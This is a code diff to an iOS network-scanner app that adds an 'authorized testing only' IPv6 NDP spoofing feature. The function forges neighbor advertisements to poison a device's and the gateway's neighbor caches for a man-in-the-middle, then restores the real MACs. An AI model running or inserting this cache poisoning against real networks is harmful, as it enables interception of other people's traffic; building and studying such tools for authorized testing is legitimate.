@@ -65,6 +65,8 @@ final class ScanViewModel {
     @ObservationIgnored private let dhcpSniffer: any DHCPSniffing
     @ObservationIgnored private let vendorLookup: (MACAddress) -> String?
     @ObservationIgnored private let wakeSender = MagicPacketSender()
+    /// (인가된 실험 전용) IPv6 이웃 광고(NA)를 위조해 이웃 캐시에 독을 묻힌다 — NeighborProber와 같은 ICMPv6 소켓
+    @ObservationIgnored private let neighborSpoofer = NDPSpoofer(advertiser: SystemNeighborAdvertiser())
     /// 앱이 백그라운드로 간 뒤 진행 중인 스캔을 마무리하는 시간(약 30초)
     @ObservationIgnored private var backgroundTask: UIBackgroundTaskIdentifier = .invalid
     @ObservationIgnored private let bannerGrabber: any BannerGrabbing
@@ -163,6 +165,55 @@ final class ScanViewModel {
     func wake(_ device: Device) async -> Bool {
         guard let mac = device.mac?.address else { return false }
         return await wakeSender.wake(mac: mac, lastKnownIP: device.address, broadcast: scannedNetwork?.subnet.broadcast)
+    }
+
+    /// NDP 스푸핑 한 판의 결과(상세 화면에 한 줄로 보여 준다).
+    enum NeighborSpoofResult: Equatable {
+        case sent(Int)
+        case blocked
+        case noNetwork
+        case noVictimIPv6
+        case noGatewayIPv6
+        case noOwnMAC
+
+        var message: String {
+            switch self {
+            case .sent(let n):
+                return "NDP 스푸핑: 위조 이웃 광고 \(n)통을 보냈어요. 상대 이웃 캐시가 바뀌었는지 다시 스캔해 확인하세요(끝나고 캐시는 원복했어요)."
+            case .blocked:
+                return "NDP 스푸핑: iOS가 ICMPv6 송신을 막았어요 — 이 기기에선 불가(랩의 맥·리눅스에선 됩니다)."
+            case .noNetwork:
+                return "NDP 스푸핑: 먼저 스캔하세요."
+            case .noVictimIPv6:
+                return "NDP 스푸핑: 이 기기의 링크로컬 IPv6(fe80::…)를 아직 몰라요 — 먼저 스캔해 이웃을 찾으세요."
+            case .noGatewayIPv6:
+                return "NDP 스푸핑: 게이트웨이의 링크로컬 IPv6를 아직 몰라요."
+            case .noOwnMAC:
+                return "NDP 스푸핑: iOS가 내 Wi-Fi MAC을 가려(02:…) 위조에 쓸 수 없어요 — 이 기기에선 불가."
+            }
+        }
+    }
+
+    /// (인가된 테스트 전용) IPv6 이웃 광고(NA)를 위조해 `device`의 이웃 캐시에 "게이트웨이는 내 MAC"을,
+    /// 게이트웨이에는 "이 기기는 내 MAC"을 심어 중간자를 시도한다(`NDPSpoof.mitm`). 몇 초 보낸 뒤 진짜 MAC으로 원복한다.
+    /// iOS가 ICMPv6 송신·자기 MAC을 막는지는 실제로 측정해 결과로 돌려준다(ARP 스푸핑의 IPv6 사촌).
+    func spoofNeighbor(_ device: Device, for duration: Duration = .seconds(6)) async -> NeighborSpoofResult {
+        guard let network = scannedNetwork else { return .noNetwork }
+        guard let victim6 = device.ipv6Addresses.first(where: \.isLinkLocal) else { return .noVictimIPv6 }
+        guard let gatewayDevice = devices[network.gateway.address],
+              let gateway6 = gatewayDevice.ipv6Addresses.first(where: \.isLinkLocal) else { return .noGatewayIPv6 }
+        guard let myMAC = Interfaces.linkLayerAddress(of: network.interfaceName ?? "en0") else { return .noOwnMAC }
+
+        let targets = NDPSpoof.mitm(victim: victim6, gateway: gateway6, attackerMAC: myMAC)
+        let run = await neighborSpoofer.poison(targets, on: network.interfaceName, every: .seconds(2), for: duration)
+
+        // 뒷정리: 아는 진짜 MAC으로 양쪽 캐시를 원복한다(impersonatedIP별로 매핑)
+        var realMACs: [IPv6Address: MACAddress] = [:]
+        if let gatewayMAC = gatewayDevice.mac?.address { realMACs[gateway6] = gatewayMAC }
+        if let victimMAC = device.mac?.address { realMACs[victim6] = victimMAC }
+        _ = neighborSpoofer.restore(targets, realMACs: realMACs, on: network.interfaceName)
+
+        return run.blocked ? .blocked : .sent(run.sent)
     }
 
     /// 지금 목록을 CSV로 내보내기. 기기가 없으면 nil
